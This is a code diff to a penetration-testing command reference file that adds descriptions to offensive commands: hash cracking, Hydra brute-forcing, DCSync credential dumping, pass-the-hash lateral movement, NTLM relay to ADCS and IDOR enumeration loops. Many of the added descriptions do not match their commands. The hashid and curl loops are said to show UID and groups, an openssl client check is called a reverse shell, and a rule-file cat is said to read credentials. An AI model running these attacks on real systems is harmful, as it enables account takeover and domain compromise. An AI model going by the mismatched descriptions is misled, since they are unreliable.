+          "command": "0    MD5\n100  SHA1\n1400 SHA-256\n1700 SHA-512\n3200 bcrypt\n10000 Django PBKDF2-SHA256\n160  HMAC-SHA1",
+          "description": "Reference table of hashcat hash mode numbers for common hash types. Use the -m flag with the corresponding number for the hash format you are cracking."
         },
         {
           "label": "Files / archives",
-          "command": "13400 KeePass\n11600 7-Zip\n13000 RAR5\n17200 PKZIP\n9600  MS Office 2013\n10500 PDF 1.4-1.6\n22921 RSA/DSA/EC/OpenSSH private key"
+          "command": "13400 KeePass\n11600 7-Zip\n13000 RAR5\n17200 PKZIP\n9600  MS Office 2013\n10500 PDF 1.4-1.6\n22921 RSA/DSA/EC/OpenSSH private key",
+          "description": "Reference table of hashcat mode numbers for encrypted file and disk formats. Covers BitLocker, KeePass, 7-Zip, RAR, PKZIP, Office, and PDF password recovery."
         }
       ],
       "opsec": "silent",
@@ -52766,11 +53077,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "John the Ripper",
-          "command": "john --format=krb5asrep --wordlist=<wordlist> <hashfile>"
+          "command": "john --format=krb5asrep --wordlist=<wordlist> <hashfile>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Show cracked",
-          "command": "hashcat -m 18200 <hashfile> --show"
+          "command": "hashcat -m 18200 <hashfile> --show",
+          "description": "Cracks AS-REP hashes from AS-REP Roasting (hashcat mode 18200). Brute-forces passwords for accounts with Kerberos pre-auth disabled."
         }
       ],
       "explain": "Cracks AS-REP roast hashes offline to recover the account's plaintext password:\n  hashcat                  the cracker\n  -m 18200                 mode 18200 = Kerberos 5 AS-REP etype 23 ($krb5asrep$)\n  <hashfile>               the GetNPUsers/Rubeus output\n  /usr/share/wordlists/rockyou.txt   the wordlist\nThe DC encrypted the AS-REP with the account's NT-hash-derived key, so a match reveals the password. Add --show to reprint cracked results."
@@ -52969,15 +53282,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "John the Ripper",
-          "command": "john --format=krb5tgs --wordlist=<wordlist> <hashfile>"
+          "command": "john --format=krb5tgs --wordlist=<wordlist> <hashfile>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "hashcat with rules",
-          "command": "hashcat -m 13100 <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule"
+          "command": "hashcat -m 13100 <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
+          "description": "Cracks Kerberoasted TGS-REP hashes (hashcat mode 13100). Takes the service ticket hash output from Kerberoasting tools and brute-forces the service account password."
         },
         {
           "label": "Show cracked",
-          "command": "hashcat -m 13100 <hashfile> --show"
+          "command": "hashcat -m 13100 <hashfile> --show",
+          "description": "Cracks Kerberoasted TGS-REP hashes (hashcat mode 13100). Takes the service ticket hash output from Kerberoasting tools and brute-forces the service account password."
         }
       ],
       "explain": "Cracks Kerberoast TGS-REP hashes offline:\n  hashcat -m 13100         mode 13100 = RC4-encrypted TGS (etype 23, fast)\n  <hashfile>               the roasted hashes\n  /usr/share/wordlists/rockyou.txt   the wordlist\nUse -m 19700 for AES256 tickets (etype 18, much slower). Recovers the service account's plaintext with no lockout or network traffic; add -r best64.rule to expand coverage."
@@ -53163,7 +53479,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "John",
-          "command": "john --format=netntlmv2 <hashfile>"
+          "command": "john --format=netntlmv2 <hashfile>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         }
       ],
       "explain": "Cracks captured NetNTLMv2 hashes offline:\n  hashcat -m 5600          mode 5600 = NetNTLMv2\n  <hashfile>               the Responder/Inveigh capture\n  /usr/share/wordlists/rockyou.txt   the wordlist\nNetNTLMv2 cannot be used for pass-the-hash, so cracking (or relaying) is the only way to leverage it; a GPU speeds this up considerably."
@@ -53232,7 +53549,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "DCC2 (2100)",
-          "command": "hashcat -m 2100 <hash_file> /usr/share/wordlists/rockyou.txt"
+          "command": "hashcat -m 2100 <hash_file> /usr/share/wordlists/rockyou.txt",
+          "description": "Cracks password hashes with hashcat (mode 2100) using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "opsec": "moderate",
@@ -53447,7 +53765,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "With Rules",
-          "command": "hashcat -a 0 -m <mode> <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+          "command": "hashcat -a 0 -m <mode> <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+          "description": "Cracks password hashes with hashcat using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "opsec": "silent",
@@ -53724,7 +54043,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Combine multiple rule files",
-          "command": "hashcat -a 0 -m <mode> <hash> <wordlist> -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule"
+          "command": "hashcat -a 0 -m <mode> <hash> <wordlist> -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule",
+          "description": "Cracks password hashes with hashcat using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "explain": "Uses the hashcat rule engine to PRINT (not crack) a mutated wordlist:\n  hashcat --force <wordlist>   run over the list\n  -r <rule_file>           apply these mutation rules\n  --stdout                 output the mutated candidates instead of cracking\n  | sort -u > mutated.list   dedupe into a new expanded list\nHandy to pre-generate a policy-aware list for reuse; the variation stacks multiple rule files."
@@ -53796,19 +54116,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "General hashes",
-          "command": "0     - MD5\n100   - SHA1\n1400  - SHA2-256\n1700  - SHA2-512\n900   - MD4\n500   - MD5 Crypt / Cisco-IOS(MD5) / FreeBSD MD5\n1800  - sha512crypt (Linux $6$ shadow)\n3200  - bcrypt $2*$ (Blowfish)\n6000  - RIPEMD-160\n600   - BLAKE2b-512"
+          "command": "0     - MD5\n100   - SHA1\n1400  - SHA2-256\n1700  - SHA2-512\n900   - MD4\n500   - MD5 Crypt / Cisco-IOS(MD5) / FreeBSD MD5\n1800  - sha512crypt (Linux $6$ shadow)\n3200  - bcrypt $2*$ (Blowfish)\n6000  - RIPEMD-160\n600   - BLAKE2b-512",
+          "description": "Reference table of hashcat hash mode numbers for common hash types. Use the -m flag with the corresponding number for the hash format you are cracking."
         },
         {
           "label": "SHA-2 / SHA-3 family",
-          "command": "1300  - SHA2-224\n1400  - SHA2-256\n10800 - SHA2-384\n1700  - SHA2-512\n17300 - SHA3-224\n17400 - SHA3-256\n17500 - SHA3-384\n17600 - SHA3-512"
+          "command": "1300  - SHA2-224\n1400  - SHA2-256\n10800 - SHA2-384\n1700  - SHA2-512\n17300 - SHA3-224\n17400 - SHA3-256\n17500 - SHA3-384\n17600 - SHA3-512",
+          "description": "Reference table of hashcat mode numbers for SHA-2 and SHA-3 hash families. Maps each SHA variant to its hashcat -m mode number."
         },
         {
           "label": "Windows / AD",
-          "command": "1000  - NT (NTLM)\n3000  - LM\n5500  - NetNTLMv1\n5600  - NetNTLMv2\n2100  - DCC2 (Domain Cached Credentials 2 / MS Cache 2)\n13100 - Kerberoast (TGS-REP, etc/RC4)\n18200 - AS-REP roast (RC4)"
+          "command": "1000  - NT (NTLM)\n3000  - LM\n5500  - NetNTLMv1\n5600  - NetNTLMv2\n2100  - DCC2 (Domain Cached Credentials 2 / MS Cache 2)\n13100 - Kerberoast (TGS-REP, etc/RC4)\n18200 - AS-REP roast (RC4)",
+          "description": "Reference table of hashcat mode numbers for Windows and Active Directory hash types. Covers NTLM, NetNTLMv1/v2, DCC, and Kerberos ticket formats."
         },
         {
           "label": "Files / disks",
-          "command": "22100 - BitLocker\n13400 - KeePass\n11600 - 7-Zip\n13000 - RAR5\n17210 - PKZIP\n9400  - MS Office 2007\n9600  - MS Office 2013\n10500 - PDF 1.4-1.6"
+          "command": "22100 - BitLocker\n13400 - KeePass\n11600 - 7-Zip\n13000 - RAR5\n17210 - PKZIP\n9400  - MS Office 2007\n9600  - MS Office 2013\n10500 - PDF 1.4-1.6",
+          "description": "Reference table of hashcat mode numbers for encrypted file and disk formats. Covers BitLocker, KeePass, 7-Zip, RAR, PKZIP, Office, and PDF password recovery."
         }
       ],
       "opsec": "silent",
@@ -53985,11 +54309,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Custom charsets (-1/-2)",
-          "command": "hashcat -a 3 -m <mode> <hashfile> -1 ?l?u -2 ?d?s '?1?1?1?1?2?2'"
+          "command": "hashcat -a 3 -m <mode> <hashfile> -1 ?l?u -2 ?d?s '?1?1?1?1?2?2'",
+          "description": "Cracks password hashes with hashcat using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         },
         {
           "label": "Incremental length",
-          "command": "hashcat -a 3 -m <mode> <hashfile> '?a?a?a?a?a?a' --increment --increment-min 4 --increment-max 6"
+          "command": "hashcat -a 3 -m <mode> <hashfile> '?a?a?a?a?a?a' --increment --increment-min 4 --increment-max 6",
+          "description": "Cracks password hashes with hashcat using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "explain": "Brute-forces against a mask that models a known password pattern:\n  hashcat -a 3             attack mode 3 = mask\n  -m <mode>                the hash algorithm\n  <hashfile>               the target hashes\n  'Autumn?d?d?d?d!'        the mask: literal 'Autumn', four digits, literal '!'\nFar faster than blind brute force when the policy or habit is known; -1/-2 define custom charsets, --increment varies the length."
@@ -54066,15 +54392,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Common rule functions",
-          "command": ":      - Do nothing (pass through)\nl      - Lowercase all letters\nu      - Uppercase all letters\nc      - Capitalize first, lowercase rest\nsXY    - Replace all X with Y (e.g. so0)\n$X     - Append character X (e.g. $!)\n^X     - Prepend character X\nr      - Reverse the word\nd      - Duplicate the word"
+          "command": ":      - Do nothing (pass through)\nl      - Lowercase all letters\nu      - Uppercase all letters\nc      - Capitalize first, lowercase rest\nsXY    - Replace all X with Y (e.g. so0)\n$X     - Append character X (e.g. $!)\n^X     - Prepend character X\nr      - Reverse the word\nd      - Duplicate the word",
+          "description": "Reference table of hashcat rule functions for password mutation. Each function transforms candidate passwords (case changes, character insertion, rotation, etc.) to expand wordlist coverage."
         },
         {
           "label": "Example custom rule file",
-          "command": "cat custom.rule\n:\nc\nso0\nc so0\nsa@\nc sa@\n$!\n$! c\n$! so0\n$! c so0 sa@"
+          "command": "cat custom.rule\n:\nc\nso0\nc so0\nsa@\nc sa@\n$!\n$! c\n$! so0\n$! c so0 sa@",
+          "description": "Reads the contents of a file for information gathering. Target files often contain credentials, configuration details, or sensitive data."
         },
         {
           "label": "Popular bundled rules",
-          "command": "/usr/share/hashcat/rules/best64.rule\n/usr/share/hashcat/rules/rockyou-30000.rule\n/usr/share/hashcat/rules/d3ad0ne.rule\n/usr/share/hashcat/rules/dive.rule\n/usr/share/hashcat/rules/leetspeak.rule\n/usr/share/hashcat/rules/toggles1-5.rule"
+          "command": "/usr/share/hashcat/rules/best64.rule\n/usr/share/hashcat/rules/rockyou-30000.rule\n/usr/share/hashcat/rules/d3ad0ne.rule\n/usr/share/hashcat/rules/dive.rule\n/usr/share/hashcat/rules/leetspeak.rule\n/usr/share/hashcat/rules/toggles1-5.rule",
+          "description": "Cracks password hashes with hashcat using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "opsec": "silent",
@@ -54256,11 +54585,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Show JtR format too (-j)",
-          "command": "hashid -j '<hash>'"
+          "command": "hashid -j '<hash>'",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "From a file, hashcat+JtR+extended",
-          "command": "hashid -mje hashes.txt"
+          "command": "hashid -mje hashes.txt",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Identifies an unknown hash and prints its hashcat mode:\n  hashid                   the identifier\n  -m                       also print the matching Hashcat mode number\n  '<hash>'                 the hash to analyze\nUse the printed mode with hashcat -m; -j shows the John format, -mje reads a file and shows both plus extended info. Always confirm the mode before a long crack."
@@ -54472,11 +54803,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Read hives from a shadow copy",
-          "command": "# copy SAM/SYSTEM/SECURITY from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\"
+          "command": "# copy SAM/SYSTEM/SECURITY from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\",
+          "description": "Read hives from a shadow copy. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Parse offline",
-          "command": "impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL"
+          "command": "impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL",
+          "description": "Uses Impacket secretsdump to dump local SAM database hashes. Extracts password hashes for local accounts from the target machine."
         }
       ],
       "steps": [
@@ -55020,23 +55353,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Python 2",
-          "command": "python2.7 -m SimpleHTTPServer"
+          "command": "python2.7 -m SimpleHTTPServer",
+          "description": "Starts a Python 2 HTTP server for hosting files. Quick way to serve payloads and tools to the target machine."
         },
         {
           "label": "PHP",
-          "command": "php -S 0.0.0.0:8000"
+          "command": "php -S 0.0.0.0:8000",
+          "description": "Starts a PHP built-in web server for hosting files. Lightweight alternative to Python HTTP server when PHP is available."
         },
         {
           "label": "Ruby",
-          "command": "ruby -run -ehttpd . -p8000"
+          "command": "ruby -run -ehttpd . -p8000",
+          "description": "Starts a Ruby HTTP server for hosting files. One-liner file server when Ruby is installed on the attack machine."
         },
         {
           "label": "Python upload server",
-          "command": "python3 -m uploadserver"
+          "command": "python3 -m uploadserver",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         },
         {
           "label": "Python FTP server (upload-capable)",
-          "command": "sudo python3 -m pyftpdlib --port 21 --write"
+          "command": "sudo python3 -m pyftpdlib --port 21 --write",
+          "description": "Python FTP server (upload-capable). See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "quiet",
@@ -56180,15 +56518,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SSH",
-          "command": "hydra -L <userlist> -P <wordlist> ssh://<ip>"
+          "command": "hydra -L <userlist> -P <wordlist> ssh://<ip>",
+          "description": "Brute-forces SSH credentials using Hydra. Tests username/password combinations against the SSH service for initial access."
         },
         {
           "label": "RDP",
-          "command": "hydra -L <userlist> -P <wordlist> rdp://<ip> -t 4"
+          "command": "hydra -L <userlist> -P <wordlist> rdp://<ip> -t 4",
+          "description": "Brute-forces RDP credentials using Hydra. Tests login combinations against the Remote Desktop service."
         },
         {
           "label": "SMB",
-          "command": "hydra -L <userlist> -P <wordlist> smb://<ip>"
+          "command": "hydra -L <userlist> -P <wordlist> smb://<ip>",
+          "description": "Brute-forces SMB credentials using Hydra. Tests login combinations against the Windows file sharing service."
         }
       ],
       "opsec": "loud",
@@ -56475,11 +56816,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "HTTP POST form",
-          "command": "hydra -L users.txt -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
+          "command": "hydra -L users.txt -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"",
+          "description": "Brute-forces web application login forms using Hydra. Tests username/password combinations against HTTP-based authentication."
         },
         {
           "label": "Single service, user:pass list",
-          "command": "hydra -C <userpass_list> <service>://<ip>"
+          "command": "hydra -C <userpass_list> <service>://<ip>",
+          "description": "Single service, user:pass list. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Replays known user:password pairs against a service (credential stuffing):\n  hydra                    the online cracker\n  -C <userpass_list>       a combined file of user:pass pairs - test each pair as-is, not every combination\n  ssh://<ip>               the service and target\nUse to replay credentials leaked or found elsewhere; the variation shows the http-post-form syntax for web login forms."
@@ -57135,11 +57478,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "base64 + md5 hash reference",
-          "command": "echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'"
+          "command": "echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'",
+          "description": "Base64 + md5 hash reference. See the command syntax for exact parameters and flags."
         },
         {
           "label": "base64 + URL-encode (no hash)",
-          "command": "echo -n 1 | base64 | tr -d '\\n' | php -r 'echo urlencode(fgets(STDIN));'"
+          "command": "echo -n 1 | base64 | tr -d '\\n' | php -r 'echo urlencode(fgets(STDIN));'",
+          "description": "Base64 + URL-encode (no hash). See the command syntax for exact parameters and flags."
         }
       ],
       "exam": "exam-ok",
@@ -57535,7 +57880,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Loop + save all objects",
-          "command": "for i in $(seq 1 500); do curl -s 'http://<ip>:<port>/documents.php?uid='$i | grep -oE 'href=\"[^\"]+\"'; done"
+          "command": "for i in $(seq 1 500); do curl -s 'http://<ip>:<port>/documents.php?uid='$i | grep -oE 'href=\"[^\"]+\"'; done",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Fetches a page for a given uid and regex-extracts the object links (file paths) from the HTML, giving the list of resources to pull for each enumerated user.:\n  -s http://<ip>:<port>/documents.php?uid=<uid>SSL / secret / source\n  <ip>                     target IP address\nChange the uid to pull another user's document links, then fetch each file."
@@ -57720,11 +58066,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Iterate the object id",
-          "command": "for i in $(seq 1 100); do curl -s 'http://<ip>/download.php?file_id='$i -o f_$i; done"
+          "command": "for i in $(seq 1 100); do curl -s 'http://<ip>/download.php?file_id='$i -o f_$i; done",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Encoded/hashed ids",
-          "command": "# decode base64/md5 ids, increment, re-encode"
+          "command": "# decode base64/md5 ids, increment, re-encode",
+          "description": "Encoded/hashed ids. See the command syntax for exact usage and parameters."
         }
       ],
       "steps": [
@@ -58018,7 +58366,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Change role/uid in the JSON body too",
-          "command": "# PUT with body {\"uid\":<admin_uid>,\"role\":\"admin\"}"
+          "command": "# PUT with body {\"uid\":<admin_uid>,\"role\":\"admin\"}",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Tests an API object for missing authorization by tampering the uid in the body/URL, or switching method (GET to read others, POST to create, DELETE to remove).\nKeep the body uid and URL uid consistent to pass integrity checks, then probe which fields/methods are actually authorized."
@@ -58378,15 +58727,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "curl IMAPS list folders",
-          "command": "curl -k 'imaps://<ip>' --user user:p4ssw0rd"
+          "command": "curl -k 'imaps://<ip>' --user user:p4ssw0rd",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "curl IMAPS verbose (banner)",
-          "command": "curl -k 'imaps://<ip>' --user <user>:1234 -v"
+          "command": "curl -k 'imaps://<ip>' --user <user>:1234 -v",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "OpenSSL IMAPS / POP3S",
-          "command": "openssl s_client -connect <ip>:imaps\nopenssl s_client -connect <ip>:pop3s"
+          "command": "openssl s_client -connect <ip>:imaps\nopenssl s_client -connect <ip>:pop3s",
+          "description": "OpenSSL (encrypted) reverse shell one-liner. Target connects back to your listener - works through NAT and most egress firewalls if the port is allowed."
         }
       ],
       "opsec": "moderate",
@@ -58721,7 +59073,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Only krbtgt",
-          "command": "impacket-secretsdump -k -no-pass -just-dc-user krbtgt -dc-ip <dc_ip> <domain>/<user>@<dc_fqdn>"
+          "command": "impacket-secretsdump -k -no-pass -just-dc-user krbtgt -dc-ip <dc_ip> <domain>/<user>@<dc_fqdn>",
+          "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
         }
       ],
       "explain": "DCSyncs an account's hashes using a Kerberos ticket (pass-the-certificate/ticket path):\n  impacket-secretsdump     the secrets dumper\n  -k -no-pass              authenticate with the ticket in KRB5CCNAME, no password\n  -dc-ip <dc_ip>           the DC to replicate from\n  -just-dc-user <target>   only pull this account's secrets (e.g. Administrator or krbtgt)\n  '<domain>/<account>'@<dc_fqdn>   the principal the ticket is for (often a machine account like DC01$)\nA machine-account TGT typically has replication rights, so this yields the Administrator/krbtgt NT hash."
@@ -58899,15 +59252,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NTDS.dit offline",
-          "command": "impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL"
+          "command": "impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL",
+          "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
         },
         {
           "label": "Remote DCSync",
-          "command": "impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc_ip>"
+          "command": "impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc_ip>",
+          "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
         },
         {
           "label": "Remote, only krbtgt",
-          "command": "impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>"
+          "command": "impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>",
+          "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
         }
       ],
       "steps": [
@@ -58988,7 +59344,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Remote (NetExec)",
-          "command": "netexec smb <dc_ip> -u <user> -p <password> -M ntdsutil"
+          "command": "netexec smb <dc_ip> -u <user> -p <password> -M ntdsutil",
+          "description": "Uses CrackMapExec for password spraying - testing a single password against multiple user accounts. Respects lockout policies by using one password per spray round."
         }
       ],
       "opsec": "loud",
@@ -59522,7 +59879,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Template DomainController",
-          "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+          "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+          "description": "Relays captured NTLM authentication to other services. Instead of cracking captured hashes, forwards the authentication to a target machine for immediate access - no password cracking needed."
         }
       ],
       "steps": [
@@ -59943,15 +60301,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "wmiexec (quieter)",
-          "command": "impacket-wmiexec <user>:'<password>'@<ip>"
+          "command": "impacket-wmiexec <user>:'<password>'@<ip>",
+          "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
         },
         {
           "label": "Pass-the-hash",
-          "command": "impacket-psexec -hashes :<nt_hash> <user>@<ip>"
+          "command": "impacket-psexec -hashes :<nt_hash> <user>@<ip>",
+          "description": "Uses Impacket psexec with pass-the-hash authentication - authenticates using an NTLM hash instead of a password. Provides SYSTEM-level shell access without knowing the plaintext password."
         },
         {
           "label": "NetExec exec",
-          "command": "nxc smb <ip> -u <user> -p '<password>' -x 'whoami'"
+          "command": "nxc smb <ip> -u <user> -p '<password>' -x 'whoami'",
+          "description": "Uses CrackMapExec to execute a command on the target via SMB (cmd.exe). Remote command execution with the output returned - useful for quick checks across multiple hosts."
         }
       ],
       "explain": "Gets an interactive SYSTEM shell on a Windows host using valid administrator credentials over SMB, by uploading a service binary and running it via the Service Control Manager.:\n  <user>      username to authenticate as\n  <password>  password\n  <ip>        target IP address\npsexec-style RCE authenticates to ADMIN$ with admin creds/hash and runs as SYSTEM (impacket-psexec / nxc -x)."
@@ -59989,35 +60350,43 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "wmiexec with hash (PtH)",
-          "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<ip>"
+          "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<ip>",
+          "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
         },
         {
           "label": "smbexec (SMB, semi-interactive, no Python on target)",
-          "command": "impacket-smbexec <domain>/<user>:<password>@<ip>"
+          "command": "impacket-smbexec <domain>/<user>:<password>@<ip>",
+          "description": "Uses Impacket smbexec for command execution through the Windows Service Control Manager. Sends commands via SMB without uploading a binary - each command creates a temporary batch file on the target."
         },
         {
           "label": "atexec (Task Scheduler, single command)",
-          "command": "impacket-atexec <domain>/<user>:<password>@<ip> \"whoami\""
+          "command": "impacket-atexec <domain>/<user>:<password>@<ip> \"whoami\"",
+          "description": "Uses Impacket atexec for command execution through the Windows Task Scheduler service. Creates a scheduled task to run the command - an alternative execution method when WMI and SMB-based tools are blocked."
         },
         {
           "label": "psexec (drops a service - loudest, SYSTEM)",
-          "command": "impacket-psexec <domain>/<user>:<password>@<ip>"
+          "command": "impacket-psexec <domain>/<user>:<password>@<ip>",
+          "description": "Psexec (drops a service - loudest, SYSTEM). See the command syntax for exact parameters and flags."
         },
         {
           "label": "GetUserSPNs via proxychains (pivot)",
-          "command": "proxychains -q impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>"
+          "command": "proxychains -q impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>",
+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         },
         {
           "label": "psexec via proxychains PTH (pivot)",
-          "command": "proxychains -q impacket-psexec -hashes :<nt_hash> <user>@<ip>"
+          "command": "proxychains -q impacket-psexec -hashes :<nt_hash> <user>@<ip>",
+          "description": "Routes commands through a SOCKS proxy (e.g., from Chisel or SSH tunnel) for pivoting. Makes local tools appear to run from the compromised network segment."
         },
         {
           "label": "wmiexec via proxychains (pivot)",
-          "command": "proxychains -q impacket-wmiexec <domain>/<user>:<password>@<ip>"
+          "command": "proxychains -q impacket-wmiexec <domain>/<user>:<password>@<ip>",
+          "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
         },
         {
           "label": "secretsdump via proxychains (pivot)",
-          "command": "proxychains -q impacket-secretsdump <domain>/<user>:<password>@<ip>"
+          "command": "proxychains -q impacket-secretsdump <domain>/<user>:<password>@<ip>",
+          "description": "Uses Impacket secretsdump to remotely extract password hashes and secrets from a target machine. Dumps SAM, LSA secrets, and cached credentials over the network."
         }
       ],
       "notes": "All need local-admin on the target. Stealth order (quiet->loud): wmiexec ~ atexec (no binary dropped) < smbexec < psexec (creates a service, event 7045). wmiexec/atexec run as the user; psexec gives SYSTEM. All accept -hashes for pass-the-hash. Also covered in: OSCP PEN-200 Chapter 23 (Lateral Movement in Active Directory).",
@@ -60403,15 +60772,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Authenticate with a password",
-          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>"
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>",
+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         },
         {
           "label": "Pass-the-ticket (Kerberos)",
-          "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user>"
+          "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user>",
+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         },
         {
           "label": "Cross-domain",
-          "command": "GetUserSPNs.py -target-domain <foreign_domain> -dc-ip <dc_ip> <domain>/<user>"
+          "command": "GetUserSPNs.py -target-domain <foreign_domain> -dc-ip <dc_ip> <domain>/<user>",
+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         }
       ],
       "steps": [
@@ -60615,11 +60987,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Roast a single user",
-          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request-user <target> -outputfile hash.txt"
+          "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request-user <target> -outputfile hash.txt",
